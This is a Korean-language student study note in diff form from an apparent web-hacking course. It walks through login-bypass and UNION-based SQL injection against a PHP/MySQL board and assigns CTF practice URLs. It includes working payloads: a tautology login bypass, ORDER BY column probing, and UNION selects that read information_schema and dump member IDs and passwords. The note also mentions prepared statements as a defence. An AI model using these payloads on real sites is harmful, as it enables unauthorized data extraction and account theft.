@@ -1,0 +1,207 @@
+재능 / 노력
+
+> 노력. (고민하는 시간)(어떤 방식으로)
+
+A : 2시간
+B : 4시간
+
+echo로 출력을 해봐야함.
+로그인 버튼 밑에 출력
+phpmyadmin에 직접 넣어보기
+
+
+*문제 발생시!
+1> 문제의 ***원인***을 찾기.
+2> _> 문제가 해결.
+
+step by step
+
+1>
+
+____________________________________________________________
+
+login bypass3,4
+-> 만들어봐야함.
+
+식별인증 동시
+로그인 로직 케이스
+
+식별인증 분리.
+
+검색은 한국어로 X
+영어로 O
+google.kr (x) google.com
+
+login bypass2 는 mysqli_real_escape_string()이 아닐까..
+
+____________________________________________________________
+
+문제를 풀고 나서 문제를 그대로 만들어보는것
+
+1.여기서 발생한 문제점은 뭘까?
+원인 파악.
+2.문제점을 해결하기 위한 시큐어코딩
+3.시큐어코딩 된 페이지를 또 우회하는 것
+
+2-3 반복 -> 이 페이지는 안전할때까지
+
+일화
+* SQL Injection
+> 대박인데?
+>> 대응방안 : Prepared Statement
+
+- SQL Injection이 불가능하다.??
+
+
+____________________________________________________________
+
+*
+SQL Injection : 인증 우회.
+-> 데이터를 추출.
+
+<1> DB 데이터를 사용하는 곳.
+<2> 그 데이터가 화면에 나오는가? 안나오는가?
+
+> 웹페이지에 데이터가 나온다 : 게시판
+> 안나온다 : 로그인, 아이디 중복체크
+
+DB에 있는데이터가 화면에 나오는 경우도 있고, 그렇지 않은 경우도 있다
+
+웹 페이지에 데이터가 나오는 경우에서
+데이터를 추출하는 방법.
+
+
+게시글 제목이 아니라. 비밀번호를 적어줘 라고 수정이 가능
+
+select * from member where id = 'normaltic' and pass ='1234' or '1'='1'
+
+
+> 만약!
+
+게시판에서! SQLi
+
+select * from board
+where idx='' or '1'='1'
+
+위의 쿼리로는 board라는 테이블을 벗어날 수 없음
+
+**** union
+select* from board where idx = '__'
+
+
+(select ~~~) union (select ~~~)
+select pass from member union select id from member
+
+select id,pass from member union select 1,2
+마지막 행에 1과 2추가
+
+union이 컬럼 개수가 맞지 않으면 에러가 뜸
+
+
+* must 지켜야함
+(select ~~~) union (select ~~~)
+select 뒤에 들어가는 컬럼개수는 똑같아야함
+
+
+* order by : 출력되는 데이터를 정렬할 때 사용.
+select id,pass from member order by id
+select id,pass from member order by pass
+
+(select ~~~) order by [column 이름]
+
+
+인덱스 번호로도 정렬 가능
+select id,pass from member order by 1 -> id
+select id,pass from member order by 2 -> pass
+
+select id, pass from member order by 3 -> error
+
+____________________________________________________________
+
+* UNION SQL INJECTION
+
+- UNION SQL Injection Process
+
+1. SQL Injection 포인트 찾기
+2. COLUMN 개수 찾기.
+3. 출력되는 column 위치 찾기.
+4. DB 이름 확인
+5. Table 이름 확인
+6. Column 이름 확인
+7. 데이터 추출
+
+
+여기서 SQL Injection이 되는지 안되는지 체크를 해야함
+
+<1번 완료>
+over%' and'1%'='1 이렇게 넣으면 over%' 출력되고 and '1%' ='1%' 뒤에 두개 글자가 같다 '
+over%' and'1%'='2
+
+<2번 완료> 4개
+over%' order by 1 #
+over%' order by 2 #
+over%' order by 3 #
+over%' order by 4 # 
+over%' order by 4 # <에러>        '
+컬럼 3개라는 뜻
+select column1, column2, column3
+
+여러개 컬럼을 조회하는데 안보이는 컬럼이 있을 수 있다
+
+<3번 완료>
+over%' union select 1,2,3,4 #           '
+2,3,4 번 컬럼이 출력되면 1이 hidden
+
+over%' union select 1,pass,3,4 from member#           '
+
+__
+<4번 완료>
+4. DB 이름 확인
+
+select database()
+over%' union select 1,database(),3,4 #      '
+
+<5번 완료>
+5. Table 이름 확인
+테이블 이름이 저장되어있는 table이 또 존재함
+> information_schema.tables
+
+SQL
+select table_name from information_schema.tables where table_schema = 'DB이름';
+
+over%' union select 1,table_name,2,3 from information_schema.tables where table_schema='DB이름'#
+'
+
+<6번 완료>
+컬럼 이름이 저장되어있는 table이 또 존재함
+select column_name from information_schema.columns where table_name = '테이블 이름'
+
+over%' union select 1, column_name from information_schema.columns where table_name = '테이블 이름'#
+'
+
+<7번 완료>
+
+7. 데이터
+select id,pass from member
+over%' union select 1, id, pass from member #
+'
+
+
+
+____________________________________________________________
+
+* 과제!
+[1] UNION SQL Injection 복습
+http://ctf.segfaulthub.com:1020/sqlInjection3.php
+
+[2] doldol 데이터만 출력하기
+http://ctf.segfaulthub.com:1020/sqlInjection_2_1.php
+
+[3] CTF 문제 풀기
+-> SQL Injection 1,2 풀어보기
+
+[+] Web 개발
+> 로그인
+> 회원가입
+> 마이페이지 (내 정보 보기)
+> 게시판
